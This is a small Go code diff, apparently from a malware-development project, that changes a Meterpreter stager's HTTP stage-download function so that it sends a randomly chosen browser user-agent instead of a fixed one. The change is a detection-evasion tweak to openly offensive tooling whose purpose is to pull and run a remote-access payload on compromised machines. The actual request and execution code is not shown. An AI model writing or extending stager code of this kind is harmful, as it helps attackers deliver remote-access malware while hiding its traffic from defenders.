@@ -20,6 +20,8 @@ import (
 	"net/http"
 	"runtime"
 	"time"
+
+	"github.com/oioio-space/maldev/useragent"
 )
 
 // Transport represents the network protocol used for Meterpreter communication.
@@ -161,7 +163,11 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 
 	ua := s.config.UserAgent
 	if ua == "" {
-		ua = "Mozilla/5.0"
+		if db, err := useragent.Load(); err == nil {
+			ua = db.RandomString("Mozilla/5.0")
+		} else {
+			ua = "Mozilla/5.0"
+		}
 	}
 	req.Header.Set("User-Agent", ua)
 
